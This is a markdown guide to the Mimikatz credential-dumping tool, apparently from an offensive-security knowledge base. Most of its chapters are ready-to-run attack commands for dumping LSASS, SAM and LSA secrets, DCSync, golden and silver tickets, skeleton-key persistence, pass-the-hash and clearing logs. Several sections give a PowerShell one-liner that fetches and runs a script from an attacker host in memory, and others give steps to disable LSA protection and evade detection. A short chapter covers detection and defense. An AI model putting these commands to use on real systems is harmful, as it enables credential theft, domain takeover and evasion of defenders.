---
tool_name: "mimikatz"
display_name: "Mimikatz"
mitre_tactic: "defense_evasion"
mitre_tactic_id: "TA0005"
mitre_subcategory: "pass_the_hash"
install_command: "git clone https://github.com/gentilkiwi/mimikatz.git"
version: "2.2.0"
github_repo: "https://github.com/gentilkiwi/mimikatz"
kali_tools_page: "https://www.kali.org/tools/mimikatz/"
difficulty_level: "advanced"
requires_root: false
gui_available: false
tags: ["windows", "credential", "ntlm", "kerberos", "lsa", "privilege-escalation"]
related_tools: ["impacket", "crackmapexec", "secretsdump"]
---

# Mimikatz

## Chapter 1: Introduction & Overview

### What is Mimikatz?
Mimikatz is a Windows post-exploitation tool that extracts plaintext passwords, hashes, PIN codes, and Kerberos tickets from memory. It's one of the most powerful credential dumping tools available.

### History & Background
- **Created:** 2007 by Benjamin Delpy
- **Maintained:** Benjamin Delpy //gentilkiwi
- **License:** MIT License
- **Purpose:** Windows credential extraction

Mimikatz revolutionized Windows security by demonstrating how credentials could be extracted from memory.

### When to Use This Tool
- **Penetration testing:** Extract credentials
- **Post-exploitation:** Dump password hashes
- **Active Directory attacks:** Kerberoasting, Pass-the-Hash
- **Forensics:** Recover credentials from memory

### Key Concepts
- **LSA:** Local Security Authority
- **SAM:** Security Account Manager
- **NTLM:** NT LAN Manager authentication
- **Kerberos:** Network authentication protocol
- **Pass-the-Hash:** Use captured hashes to authenticate

---

## Chapter 2: Installation & Setup

### System Requirements
- **OS:** Windows (or Wine on Linux)
- **Privileges:** Administrator (for most features)
- **RAM:** 512 MB minimum

### Installation Methods

#### Method 1: Download Release
```bash
# Download from GitHub
https://github.com/gentilkiwi/mimikatz/releases

# Extract mimikatz.exe and mimilib.dll
```

#### Method 2: From Source
```bash
git clone https://github.com/gentilkiwi/mimikatz.git
# Build with Visual Studio
```

#### Method 3: Metasploit Module
```bash
# Upload to target
upload /path/to/mimikatz.exe C:\\Windows\\Temp\\

# Execute
execute -f C:\\Windows\\Temp\\mimikatz.exe -i
```

### Verification
```bash
mimikatz.exe "version" "exit"
```

---

## Chapter 3: Basic Usage

### First Run
```bash
# Start mimikatz
mimikatz.exe

# Enable debug privilege
privilege::debug

# Dump passwords
sekurlsa::logonpasswords
```

### Essential Commands

#### Enable Debug Privilege
```bash
privilege::debug
```
**Explanation:** Enables SeDebugPrivilege for credential extraction.

#### Dump Logon Passwords
```bash
sekurlsa::logonpasswords
```
**Explanation:** Extracts plaintext passwords and hashes from memory.

#### Dump SAM Database
```bash
lsadump::sam
```
**Explanation:** Extracts local account hashes from SAM.

#### Dump LSA Secrets
```bash
lsadump::secrets
```
**Explanation:** Extracts LSA secrets (service accounts, etc.).

### Complete Module Reference

#### Sekurlsa Module (Credential Extraction)
| Command | Description | Example |
|---------|-------------|---------|
| `sekurlsa::logonpasswords` | Logon passwords | `sekurlsa::logonpasswords` |
| `sekurlsa::wdigest` | WDigest passwords | `sekurlsa::wdigest` |
| `sekurlsa::kerberos` | Kerberos tickets | `sekurlsa::kerberos` |
| `sekurlsa::msv` | MSV credentials | `sekurlsa::msv` |
| `sekurlsa::tspkg` | TsPkg credentials | `sekurlsa::tspkg` |
| `sekurlsa::credman` | Credential Manager | `sekurlsa::credman` |
| `sekurlsa::pth` | Pass-the-Hash | `sekurlsa::pth /user:admin /ntlm:hash` |
| `sekurlsa::ticket` | Extract tickets | `sekurlsa::ticket /export` |
| `sekurlsa::ekeys` | Kerberos encryption keys | `sekurlsa::ekeys` |

#### Lsadb Module (LSA Database)
| Command | Description | Example |
|---------|-------------|---------|
| `lsadump::sam` | SAM database | `lsadump::sam` |
| `lsadump::secrets` | LSA secrets | `lsadump::secrets` |
| `lsadump::cache` | Cached credentials | `lsadump::cache` |
| `lsadump::lsa` | LSA dump | `lsadump::lsa /patch` |
| `lsadump::dcsync` | DCSync | `lsadump::dcsync /user:krbtgt` |

#### Kerberos Module
| Command | Description | Example |
|---------|-------------|---------|
| `kerberos::list` | List tickets | `kerberos::list` |
| `kerberos::ptt` | Pass-the-Ticket | `kerberos::ptt ticket.kirbi` |
| `kerberos::golden` | Golden Ticket | `kerberos::golden /user:admin /domain:domain /sid:S-1-5-21 /krbtgt:hash` |
| `kerberos::silver` | Silver Ticket | `kerberos::silver /service:cifs /user:admin /domain:domain /sid:S-1-5-21 /target:dc` |
| `kerberos::purge` | Purge tickets | `kerberos::purge` |
| `kerberos::hash` | Generate hash | `kerberos::hash /password:pass /domain:domain` |

#### Crypto Module
| Command | Description | Example |
|---------|-------------|---------|
| `crypto::capi` | CAPI provider | `crypto::capi` |
| `crypto::cng` | CNG provider | `crypto::cng` |
| `crypto::certificates` | Certificates | `crypto::certificates /export` |
| `crypto::keys` | Private keys | `crypto::keys /export` |
| `crypto::tokencap` | Token impersonation | `crypto::tokencap` |

#### Vault Module
| Command | Description | Example |
|---------|-------------|---------|
| `vault::cred` | Credentials | `vault::cred` |
| `vault::list` | Vault entries | `vault::list` |
| `vault::cred /patch` | Patch vault | `vault::cred /patch` |

#### Miscellaneous Commands
| Command | Description | Example |
|---------|-------------|---------|
| `privilege::debug` | Enable debug | `privilege::debug` |
| `privilege::token` | Token manipulation | `privilege::token /elevate` |
| `token::elevate` | Elevate token | `token::elevate` |
| `token::list` | List tokens | `token::list` |
| `misc::skeleton` | Skeleton key | `misc::skeleton` |
| `misc::memssp` | Memory SSP | `misc::memssp` |
| `event::clear` | Clear logs | `event::clear` |
| `event::drop` | Drop events | `event::drop` |

---

## Chapter 4: Intermediate Usage

### Advanced Credential Extraction

#### WDigest Extraction
```bash
# Enable WDigest in registry
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

# Extract passwords
sekurlsa::wdigest
```

#### Kerberos Ticket Extraction
```bash
# List all tickets
kerberos::list

# Export tickets
kerberos::list /export

# Use ticket
kerberos::ptt ticket.kirbi
```

### Scripting & Automation

#### PowerShell Wrapper
```powershell
# Load mimikatz in memory
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://attacker/mimikatz.ps1')

# Execute commands
Invoke-Mimikatz -Command "privilege::debug; sekurlsa::logonpasswords"
```

#### Batch Script
```batch
@echo off
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Combining with Other Tools

#### With Metasploit
```bash
# Upload mimikatz
upload /path/to/mimikatz.exe C:\\Windows\\Temp\\

# Execute mimikatz
execute -f C:\\Windows\\Temp\\mimikatz.exe -i -H

# Or use meterpreter extension
load kiwi
creds_all
```

#### With CrackMapExec
```bash
# Use hashes with crackmapexec
crackmapexec smb target -u admin -H 'aad3b435b51404eeaad3b435b51404ee:...'
```

### Advanced Configurations

#### Custom Mimikatz Build
```bash
# Clone repository
git clone https://github.com/gentilkiwi/mimikatz.git

# Build with Visual Studio
# Solution file: mimikatz.sln

# Select x86/x64 Release
```

### Performance Optimization

#### Stealth Mode
```bash
# Run from memory
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug; sekurlsa::logonpasswords'"

# Avoid disk write
```

---

## Chapter 5: Advanced Usage

### Advanced Attack Techniques

#### DCSync Attack
```bash
# Dump domain hash
lsadump::dcsync /user:krbtgt

# Dump specific user
lsadump::dcsync /user:domain\administrator

# From remote
lsadump::dcsync /user:domain\administrator /dc:dc01.domain.local
```

#### Golden Ticket
```bash
# Create golden ticket
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /ptt

# Use golden ticket
# Now access any resource in domain
```

#### Silver Ticket
```bash
# Create silver ticket
kerberos::silver /service:cifs /user:administrator /domain:domain.local /sid:S-1-5-21-... /rc4:hash /ptt

# Use silver ticket
# Access specific service
```

#### Skeleton Key
```bash
# Inject skeleton key
misc::skeleton

# Use any password with all accounts
# Default password: "mimikatz"
```

### Integration in Pentest Workflow

#### Phase 1: Initial Access
```bash
# Get system access
# Use credentials from phishing, exploit, etc.
```

#### Phase 2: Credential Dumping
```bash
# Enable debug
privilege::debug

# Dump credentials
sekurlsa::logonpasswords

# Dump SAM
lsadump::sam
```

#### Phase 3: Lateral Movement
```bash
# Use captured hashes
sekurlsa::pth /user:admin /ntlm:hash /domain:domain.local /run:cmd.exe

# Use Kerberos tickets
kerberos::ptt ticket.kirbi
```

#### Phase 4: Persistence
```bash
# Create golden ticket
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash

# Install skeleton key
misc::skeleton
```

### Advanced Configurations

#### Memory Operations
```bash
# Patch LSASS
sekurlsa::patch

# Inject into LSASS
misc::memssp
```

### Performance Optimization

#### Minimize Footprint
```bash
# Run from memory only
# Avoid writing to disk
# Use PowerShell injection
```

---

## Chapter 6: Real-World Scenarios

### Scenario 1: CTF Challenge
**Objective:** Extract admin password

**Steps:**
```bash
# 1. Get admin access
# 2. Upload mimikatz
# 3. Run mimikatz
privilege::debug
sekurlsa::logonpasswords

# 4. Find admin hash
# 5. Use hash to access other systems
```

### Scenario 2: Penetration Test
**Objective:** Domain compromise

**Steps:**
```bash
# 1. Dump credentials
privilege::debug
sekurlsa::logonpasswords

# 2. DCSync for domain hash
lsadump::dcsync /user:krbtgt

# 3. Create golden ticket
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash

# 4. Access domain resources
```

### Scenario 3: Red Team Operation
**Objective:** Covert credential theft

**Steps:**
```bash
# 1. Memory-only execution
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/mimikatz.ps1')"

# 2. Extract credentials
Invoke-Mimikatz -Command "privilege::debug; sekurlsa::logonpasswords"

# 3. Clean up
# 4. Exfiltrate data
```

---

## Chapter 7: Detection & Defense

### How Defenders Detect Mimikatz

#### System Indicators
```
# LSASS memory access
# Suspicious process injection
# WDigest enabling in registry
# Kerberos ticket anomalies
```

#### Log Analysis
```bash
# Windows Event Logs
# Event ID 4624 - Logon
# Event ID 4672 - Special privileges assigned
# Event ID 4688 - Process creation

# Sysmon
# Event ID 10 - Process access to LSASS
```

### Mitigation Strategies

#### Credential Guard
```bash
# Enable Windows Credential Guard
# Prevents credential extraction from memory
```

#### LSA Protection
```bash
# Enable RunAsPPL
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 1 /f
```

#### Disable WDigest
```bash
# Disable plaintext password storage
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
```

#### Monitor for Mimikatz
```bash
# Use Sysmon
# Monitor LSASS access
# Alert on suspicious processes
```

### Blue Team Response
1. **Enable Credential Guard** - Prevent memory extraction
2. **Enable LSA Protection** - Protect LSASS
3. **Disable WDigest** - Don't store plaintext
4. **Monitor LSASS access** - Detect extraction attempts
5. **Use Windows Event Forwarding** - Centralize logs

---

## Chapter 8: Troubleshooting

### Common Errors

#### Error: "privilege::debug failed"
**Cause:** Not running as administrator
**Solution:**
```bash
# Run as administrator
# Right-click → Run as administrator
```

#### Error: "sekurlsa::logonpasswords failed"
**Cause:** LSA Protection enabled
**Solution:**
```bash
# Disable RunAsPPL
reg delete HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /f

# Or use different approach
lsadump::sam
```

### Performance Optimization

#### Slow Extraction
```bash
# Use specific module
sekurlsa::msv
sekurlsa::wdigest
```

### FAQ

**Q: Is mimikatz legal to use?**
A: Yes, mimikatz is a legitimate security testing tool. However, using it without authorization is illegal. Always get written permission before testing.

**Q: How do I update mimikatz?**
A: Download latest release from GitHub or rebuild from source.

**Q: Can I use mimikatz on Linux?**
A: No, mimikatz is Windows-only. Use impacket tools on Linux.

**Q: How do I prevent mimikatz detection?**
A: Use PowerShell injection, memory-only execution, and avoid writing to disk.

**Q: What is DCSync?**
A: DCSync simulates a domain controller to replicate credentials from AD.

---

## Resources

### Official Documentation
- [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
- [Mimikatz Wiki](https://github.com/gentilkiwi/mimikatz/wiki)
- [Mimikatz Documentation](https://adsecurity.org/?page_id=1821)

### Tutorials
- [Mimikatz Tutorial - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-attacks/mimikatz)
- [Mimikatz Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)

### Related Tools
- **impacket:** Python network toolkit
- **crackmapexec:** Network exploitation
- **secretsdump:** Impacket credential dumping
- **pypykatz:** Python Mimikatz implementation

### Practice Resources
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [VulnHub](https://www.vulnhub.com/)
